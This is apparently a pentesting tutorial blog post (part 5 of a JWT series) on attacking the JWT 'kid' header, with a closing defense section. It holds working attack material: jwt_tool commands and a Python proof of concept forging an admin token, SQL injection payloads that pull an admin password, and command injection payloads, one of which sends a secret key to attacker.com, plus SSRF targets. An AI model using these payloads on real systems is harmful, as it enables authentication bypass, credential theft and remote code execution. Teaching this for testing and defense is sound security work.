---
title: "JWT, Part 5: kid injection - SQL Injection via token header"
date: 2026-03-20T18:04:00+03:00
number: 5
tags: ["jwt", "security", "web", "auth"]
summary: "The RFC doesn't define the structure of kid. Developers use it as a file path, SQL parameter, or command argument. Each option is a separate class of vulnerability."
---

**Table of contents:**
- [Why kid is vulnerable](#why-kid-is-vulnerable)
- [Path Traversal via /dev/null](#path-traversal-via-devnull)
- [SQL Injection via kid](#sql-injection-via-kid)
- [Command Injection](#command-injection)
- [Testing checklist for kid](#testing-checklist-for-kid)
- [Defense](#defense)
- [What's next](#whats-next)

In articles 3-4 we attacked the `alg` field in the JWT header. But remember the list of header parameters from the second article? `kid`, `jku`, `jwk`, `x5u`, `x5c` - each one is an attack vector. Starting with `kid`.

## Why kid is vulnerable

`kid` (Key ID) - an optional JWT header parameter. When a server has multiple signing keys (for example, old and new during rotation), `kid` indicates which specific key to use for signature verification. The server receives the token, looks at `kid` in the header, finds the corresponding key in its storage, and verifies the signature.

And here's the key point: **the RFC does not define the structure of `kid`**. At all. The specification states: "The structure of the 'kid' value is unspecified. Its value MUST be a case-sensitive string." An arbitrary string, with no restrictions on format or content.

This means developers are free to interpret `kid` however they want. Some use it as a filename - and read the key from the filesystem. Some use it as an SQL parameter - and look up the key in a database. Some pass it to a system command. Each of these options is a separate class of vulnerability.

## Path Traversal via /dev/null

If the server uses `kid` as a path to a key file, we inject a path traversal:

```json
{"alg": "HS256", "kid": "../../../../../../../dev/null"}
```

`/dev/null` when read always returns an empty string (zero bytes). The server read the "key" from `/dev/null` - got an empty string. The attacker signs the token with an empty key - signatures match.

```bash
python3 jwt_tool.py "$TOKEN" -I -hc kid \
  -hv "../../../../dev/null" -S hs256 -p ""
```

Works? Great. But `/dev/null` isn't the only option. There are files with predictable content that can be used as a key:

**`/proc/sys/kernel/randomize_va_space`** - on Linux always contains `2` (ASLR enabled). Sign the token with the string `"2"`:

```bash
python3 jwt_tool.py "$TOKEN" -I -hc kid \
  -hv "/proc/sys/kernel/randomize_va_space" \
  -S hs256 -p "2"
```

**`/etc/hostname`** - may be predictable, especially in Docker containers with default names.

The idea is clear: find a file whose content you know and use that content as the HMAC key.

## SQL Injection via kid

If the server looks up the key in a database, the SQL query might look like this:

```sql
SELECT key_value FROM jwt_keys WHERE kid = '<kid>'
```

We inject classic UNION-based SQLi:

```json
{"alg": "HS256", "kid": "x' UNION SELECT 'ATTACKER';-- -"}
```

The query becomes:

```sql
SELECT key_value FROM jwt_keys WHERE kid = 'x' UNION SELECT 'ATTACKER';-- -'
```

The first SELECT finds nothing (no key with kid = `x`), and the UNION returns the string `ATTACKER`. The server gets `ATTACKER` as the key value and uses it for verification. We sign the token with the same string `ATTACKER` - and the signature matches.

```bash
python3 jwt_tool.py "$TOKEN" -I -hc kid \
  -hv "x' UNION SELECT 'ATTACKER';-- -" \
  -S hs256 -p "ATTACKER"
```

But SQLi doesn't stop there. Since we can inject SQL queries, we can extract data:

```
x' UNION SELECT password FROM users WHERE username='admin';-- -
```

If this works, we get the admin's password as the "key", sign the token with it, and simultaneously learn the password. Two bugs for the price of one.

Manual PoC in Python:

```python
import hmac, hashlib, base64, json

def b64e(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

header = {"alg":"HS256","typ":"JWT",
  "kid":"x' UNION SELECT 'KEY';-- -"}
payload = {"sub":"admin","role":"superuser"}

h = b64e(json.dumps(header, separators=(',',':')).encode())
p = b64e(json.dumps(payload, separators=(',',':')).encode())

sig = hmac.new(b"KEY", f"{h}.{p}".encode(),
    hashlib.sha256).digest()
print(f"{h}.{p}.{b64e(sig)}")
```

## Command Injection

Some servers pass `kid` to a system command to load the key. Ruby's `open()` function is particularly dangerous, as it supports the pipe operator: `open("| command")` will execute `command` as a shell command.

```json
{"alg": "HS256", "kid": "| whoami"}
```

Ruby's `open("| whoami")` will execute `whoami` and return the result. Other payload variants:

```
| curl http://attacker.com/steal?k=$(cat /app/secret.key)
key1; whoami
key1 && cat /etc/passwd
key1$(id)
```

Command injection via `kid` is rarer than path traversal or SQLi, but when it occurs - it's usually RCE.

## Testing checklist for kid

Here's the sequence of checks I go through on every engagement:

1. **Is kid present in the token?** Decode the header, check for the kid field
2. **Path traversal:** `../../../../dev/null` with an empty key
3. **Predictable files:** `/proc/sys/kernel/randomize_va_space` with key `"2"`
4. **SQL injection:** `' UNION SELECT 'test';-- -` with key `"test"`. If the server returns 200 - confirmed
5. **Blind SQLi:** `' AND 1=1;-- -` vs `' AND 1=2;-- -`. Different responses - blind SQLi
6. **Command injection:** `| sleep 5` - if the response is delayed by 5 seconds, there's RCE
7. **SSRF:** `http://169.254.169.254/` (AWS metadata), `http://127.0.0.1:6379/` (Redis)

## Defense

RFC 8725 Section 3.10 explicitly states: `kid` MUST be sanitized.

Specific recommendations:
- **Don't use `kid` as a file path.** Store keys in a key store indexed by kid, without filesystem access.
- **Parameterized SQL queries.** `WHERE kid = ?` instead of string concatenation.
- **Allowlist of valid `kid` values.** If you have 3 keys - allow only 3 specific kid values.
- **Never pass `kid` to shell commands.**

## What's next

`kid` is one header parameter. But there are four more like it in the header. In the next article - `jku`, `x5u`, `jwk`, `x5c`: when the token tells the server "download my key from this URL" or "here's my key, embedded right in the header". SSRF, key substitution, and self-signed certificates.
